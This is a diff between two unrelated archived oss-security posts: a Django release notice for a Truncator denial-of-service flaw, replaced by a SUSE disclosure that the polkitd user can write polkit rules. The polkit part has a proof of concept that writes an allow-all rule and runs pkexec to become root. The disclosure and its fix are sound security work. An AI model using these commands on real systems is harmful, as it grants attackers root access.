@@ -1,111 +1,104 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/10/04/6
-Message-ID: <CA+fOnFbWkvAi61HywFWrnm+6dcT-OvYEmDQ7kij5bLTc+fSerA@mail.gmail.com>
-Date: Wed, 4 Oct 2023 13:02:50 -0300
-From: Natalia Bidart <nataliabidart@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/03/29/3
+Message-ID: <20230329133450.GK21675@suse.com>
+Date: Wed, 29 Mar 2023 15:34:50 +0200
+From: Johannes Segitz <jsegitz@...e.de>
 To: oss-security@...ts.openwall.com
-Cc: Django Security Team <security@...ngoproject.com>
-Subject: Django: CVE-2023-43665: Denial-of-service possibility in django.utils.text.Truncator
+Subject: polkitd service user privilege separation
 Content-Type: text/plain; charset=utf-8
 
-https://www.djangoproject.com/weblog/2023/oct/04/security-releases/
+Hello,
 
-In accordance with `our security release policy
-<https://docs.djangoproject.com/en/dev/internals/security/>`_, the Django
-team
-is issuing
-`Django 4.2.6 <https://docs.djangoproject.com/en/dev/releases/4.2.6/>`_,
-`Django 4.1.12 <https://docs.djangoproject.com/en/dev/releases/4.1.12/>`_,
-and
-`Django 3.2.22 <https://docs.djangoproject.com/en/dev/releases/3.2.22/>`_.
-These releases address the security issue detailed below. We encourage all
-users of Django to upgrade as soon as possible.
+I'm a member of the SUSE product security team. During the product audit
+for SLES 15 SP5 I noticed an issue with polkit:
 
-CVE-2023-43665: Denial-of-service possibility in django.utils.text.Truncator
-============================================================================
+# Default rules config writeable for the service user
 
-Following the fix for CVE-2019-14232, the regular expressions used in the
-implementation of ``django.utils.text.Truncator``’s ``chars()`` and
-``words()`` methods
-(with ``html=True``) were revised and improved. However, these regular
-expressions
-still exhibited linear backtracking complexity, so when given a very long,
-potentially malformed HTML input, the evaluation would still be slow,
-leading
-to a potential denial of service vulnerability.
+polkit stores rules in /etc/polkit-1/rules.d. We follow the upstream
+provided permissions for this folder, so polkitd owns it and permissions
+are set to 700:
 
-The ``chars()`` and ``words()`` methods are used to implement the
-``truncatechars_html``
-and ``truncatewords_html`` template filters, which were thus also
-vulnerable.
+localhost:/etc/polkit-1/rules.d # ls -lah
+total 64K
+drwx------ 1 polkitd root  44 Mar  8 18:29 .
+drwxr-xr-x 1 root    root  14 Mar  8 17:16 ..
+-rw-r--r-- 1 root    root 64K Mar  8 17:18 90-default-privs.rules
 
-The input processed by ``Truncator``, when operating in HTML mode, has been
-limited
-to the first five million characters in order to avoid potential performance
-and memory issues.
+Since the user owns the directory it's easy to escalate from user polkitd
+to root. The user can create own rules that are interpreted by the polkit
+authority which in turn grants root privileges via e.g. the setuid-root
+binary pkexec.
 
-Thanks Wenchao Li of Alibaba Group for the report.
+# POC
 
-This issue has severity "moderate" according to the Django security policy.
+To show the impact of this get access to a shell running as polkitd. The
+easiest way is to spawn a root shell, then change into the polkitd user:
 
-Affected supported versions
-===========================
+root $ sudo -u polkitd /bin/sh
+polkitd $ id
+uid=475(polkitd) gid=475(polkitd) groups=475(polkitd)
+polkitd $ pkexec id
+==== AUTHENTICATING FOR org.freedesktop.policykit.exec ====
+Authentication is needed to run `/usr/bin/id' as the super user
+Authenticating as: root
+Password:
 
-* Django main branch
-* Django 5.0 (currently at pre-release alpha status)
-* Django 4.2
-* Django 4.1
-* Django 3.2
+So with the default rules the root password would be required. Since the
+rules directory is writeable we can add a rule that allows everything:
 
-Resolution
-==========
+polkitd $ echo 'polkit.addRule(function(action, subject) { return "yes"; });' > /etc/polkit-1/rules.d/00-allow-all.rules
+polkitd $ pkexec id
+uid=0(root) gid=0(root) groups=0(root)
 
-Patches to resolve the issue have been applied to Django's main branch and
-the
-5.0, 4.2, 4.1, and 3.2 release branches. The patches may be obtained from
-the
-following changesets:
+This demonstration caused some confusion in the original report to
+upstream. The POC is here to demonstrate the issue, not how real world
+exploitation would work. A real world exploit would rely on another
+vulnerability to be able to act as polkitd and then use the issue outlined
+here to escalate privileges.
 
-* On the `main branch <
-https://github.com/django/django/commit/17b51094d778b421bb2b3aae0c270894b050455d
->`__
-* On the `5.0 release branch <
-https://github.com/django/django/commit/8124c42601b9abfeb234056092a62a22a22107cb
->`__
-* On the `4.2 release branch <
-https://github.com/django/django/commit/be9c27c4d18c2e6a5be8af4e53c0797440794473
->`__
-* On the `4.1 release branch <
-https://github.com/django/django/commit/c7b7024742250414e426ad49fb80db943e7ba4e8
->`__
-* On the `3.2 release branch <
-https://github.com/django/django/commit/ccdade1a0262537868d7ca64374de3d957ca50c5
->`__
+# Proposed solution
 
-The following releases have been issued:
+If you can act as the polkitd user you can also likely influence the polkit
+daemon and gain root this way, so this just makes it (a lot) easier to exploit.
+I still think it's worthwhile to keep the user for the daemon and not run it as
+root.
 
-* Django 4.2.6 (`download Django 4.2.6 <
-https://www.djangoproject.com/m/releases/4.2/Django-4.2.6.tar.gz>`_ |
-`4.2.6 checksums <
-https://www.djangoproject.com/m/pgp/Django-4.2.6.checksum.txt>`_)
-* Django 4.1.12 (`download Django 4.1.12 <
-https://www.djangoproject.com/m/releases/4.1/Django-4.1.12.tar.gz>`_ |
-`4.1.12 checksums <
-https://www.djangoproject.com/m/pgp/Django-4.1.12.checksum.txt>`_)
-* Django 3.2.22 (`download Django 3.2.22 <
-https://www.djangoproject.com/m/releases/3.2/Django-3.2.22.tar.gz>`_ |
-`3.2.22 checksums <
-https://www.djangoproject.com/m/pgp/Django-3.2.22.checksum.txt>`_)
+For existing installations change the permissions of
+- /etc/polkit-1/rules.d
+- /usr/share/polkit-1/rules.d
+to root:polkitd, 750 to make it harder to gain root privileges.
 
-The PGP key ID used for this release is Natalia Bidart: `2EE82A8D9470983E <
-https://github.com/nessita.gpg>`_
+SELinux or other more fine-grained control could be used to make escalating
+to root harder, by restricting the amount of freedom polkitd has. But in
+the end it's probably not possible to fully prevent this.
 
-General notes regarding security reporting
-==========================================
+Currently the documentation raises the expectation that there's a security
+boundary (man polkit):
+The polkit authority is implemented as an system daemon, polkitd(8), which
+itself has little privilege as it is running as the polkitd system user.
 
-As always, we ask that potential security issues be reported via
-private email to ``security@...ngoproject.com``, and not via Django's
-Trac instance or the django-developers list. Please see `our security
-policies <https://www.djangoproject.com/security/>`_ for further
-information.
+Through this posting I wanted to raise awareness that the polkitd user in a
+default installation is equivalent to root without any further counter
+measures. In my opinion this should be stated in the man pages so that
+users are aware of this. At the moment most people would likely assume that
+the user serves a similar roles as other service users.
 
+# Communication with upstream
+
+- 2023-03-09: Informed upstream via confidential ticket:
+  https://gitlab.freedesktop.org/polkit/polkit/-/issues/191
+- 2023-03-15: Proposed documentation fix, not merged
+  https://gitlab.freedesktop.org/polkit/polkit/-/issues/191#note_1824052
+- 2023-03-21: Partial fix for the permission in
+  https://gitlab.freedesktop.org/polkit/polkit/-/merge_requests/153
+- 2023-03-29: Issue is public
+
+Johannes
+-- 
+GPG Key                EE16 6BCE AD56 E034 BFB3  3ADD 7BF7 29D5 E7C8 1FA0
+Subkey fingerprint:    250F 43F5 F7CE 6F1E 9C59  4F95 BC27 DD9D 2CC4 FD66
+SUSE Software Solutions Germany GmbH, Frankenstraße 146, 90461 Nürnberg, Germany
+Geschäftsführer: Ivo Totev, Andrew Myers, Andrew McDonald, Boudien Moerman
+(HRB 36809, AG Nürnberg)
+
+Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
